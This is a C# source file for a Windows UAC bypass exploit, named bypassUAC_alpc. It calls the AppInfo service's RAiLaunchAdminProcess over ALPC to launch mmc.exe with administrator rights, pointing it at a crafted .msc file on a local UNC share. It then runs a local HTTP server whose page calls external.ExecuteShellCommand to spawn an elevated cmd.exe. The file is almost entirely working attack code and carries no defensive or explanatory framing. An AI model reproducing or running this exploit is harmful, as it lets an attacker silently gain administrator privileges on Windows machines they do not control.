using NtApiDotNet;
using NtApiDotNet.Ndr.Marshal;
using NtApiDotNet.Win32;
using rpc_201ef99a_7fa0_444c_9399_19ba84f12a1a_1_0;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Text;
using System.Threading;

namespace bypassUAC_alpc
{
    class Program
    {
        [Flags]
        enum StartFlags
        {
            None = 0,
            RunAsAdmin = 0x1,
            Unknown02 = 0x2,
            Unknown04 = 0x4,
            Wow64Path = 0x8,
            Unknown10 = 0x10,
            Unknown20 = 0x20,
            Unknown40 = 0x40,
            Untrusted = 0x80,
            CentennialElevation = 0x200,
        }

        [DllImport("User32.dll")]
        static extern IntPtr GetDesktopWindow();



        static NtProcess LaunchAdminProcess(string executable, string cmdline, StartFlags flags, CreateProcessFlags create_flags, string desktop)
        {
            StartAppinfoService();

            using (Client client = new Client())
            {
                client.Connect();
                create_flags |= CreateProcessFlags.UnicodeEnvironment;
                Struct_0 start_info = new Struct_0();
                int retval = client.RAiLaunchAdminProcess(executable, cmdline, (int)flags, (int)create_flags,
                    @"c:\windows", desktop, start_info, new NdrUInt3264(GetDesktopWindow()),
                    -1, out Struct_2 proc_info, out int elev_type);
                if (retval != 0)
                {
                    throw new Win32Exception(retval);
                }

                using (var thread = NtThread.FromHandle(new IntPtr(proc_info.Member8.Value)))
                {
                    return NtProcess.FromHandle(new IntPtr(proc_info.Member0.Value));
                }
            }
        }

        static void StartAppinfoService()
        {
            try
            {
                ServiceController service = new ServiceController("appinfo");
                if (service.Status != ServiceControllerStatus.Running)
                {
                    service.Start();
                    service.WaitForStatus(ServiceControllerStatus.Running, TimeSpan.FromSeconds(5));
                }
            }
            catch
            {
            }
        }

        /*
         * RAiLaunchAdminProcess(
            handle,                                                   handle
            L"C:\\Windows\\System32\\mmc.exe",                        执行路径  
            L"XXX,wf.msc \"\\\\127.0.0.1\\C$\\gweeperx\\test.msc\"",  执行命令  *
            0x1,                                                      StartFlag  1是管理员0是当前用户
            0x00000400,                                               CreateFlag
            L"D:\\",                                                  当前目录
            L"WinSta0\\Default",                                      WindowsStation
            &StructMember0,                                           Struct APP_STARTUP_INFO
            0,                                                        HWND
            0xffffffff,                                               Timeout
            &Struct_56,                                               Struct APP_PROCESS_INFORMATION
            &arg_12                                                   ElevationType
        );
        */

        public static void OpenWebServer() {
            Socket socketWatch = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            socketWatch.Bind(new IPEndPoint(IPAddress.Parse("127.0.0.1"), 2332));
            socketWatch.Listen(20); 

            Socket socket = socketWatch.Accept();

            byte[] data = new byte[1024 * 1024 * 4];
            System.Threading.Thread.Sleep(1000);
            int sizenum = socket.Available;
            Console.WriteLine(sizenum);
            int length = socket.Receive(data, 0, sizenum, SocketFlags.None);

            
            string requestText = Encoding.UTF8.GetString(data, 0, length);
            Console.WriteLine(requestText);
            //byte[] body = Encoding.UTF8.GetBytes("<script>external.ExecuteShellCommand(\"cmd.exe\",\"C:\",\"\",\"Restored\");</script>");
            //byte[] body = Encoding.UTF8.GetBytes("<script>external.ExecuteShellCommand(\"cmd.exe\",\"0\",\"0\",\"0\");</script>");

            string statusline = "HTTP/1.1 200 OK\r\n";   //状态行
            byte[] statusline_to_bytes = Encoding.UTF8.GetBytes(statusline);
            string content =
            "<html>" +
                "<head>" +
                    "<title>socket webServer</title>" +
                    "<script>external.ExecuteShellCommand(\"cmd.exe\",\"0\",\"0\",\"0\");</script>" +
                "</head>" +
            "</html>";

            byte[] content_to_bytes = Encoding.UTF8.GetBytes(content);
            string header = string.Format("Content-Type:text/html;charset=UTF-8\r\nContent-Length:{0}\r\n", content_to_bytes.Length);
            byte[] header_to_bytes = Encoding.UTF8.GetBytes(header);  //应答头
            socket.Send(statusline_to_bytes);  //发送状态行
            socket.Send(header_to_bytes);  //发送应答头
            socket.Send(new byte[] { (byte)'\r', (byte)'\n' });  //发送空行
            socket.Send(content_to_bytes);  //发送正文（html）


            //byte[] head = Encoding.UTF8.GetBytes("HTTP/1.1 200 OK\nContent-Type: text/html\nConnection: Close\n\n");
            //socket.Send(head);

            //socket.Send(body);
                //i = i + 1;

            //socket.Shutdown(SocketShutdown.Both);
            socket.Close();

        }

        static void Main(string[] args)
        {
            try
            {
                StartFlags flags = StartFlags.RunAsAdmin;
                List<string> cmds = new List<string>(args);

                string executable = "C:\\Windows\\System32\\mmc.exe";
                string commandline = "XXX,wf.msc \"\\\\127.0.0.1\\C$\\testmscdir\\test.msc\"";
                
                using (var proc = LaunchAdminProcess(executable, commandline, flags, CreateProcessFlags.UnicodeEnvironment, @"WinSta0\Default"))
                {
                    Console.WriteLine("Start process {0}", proc.ProcessId);
                    Console.WriteLine("Granted Access: {0}", proc.GrantedAccess);
                }
                System.Threading.Thread.Sleep(1000);
                OpenWebServer();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }

        }
    }
}
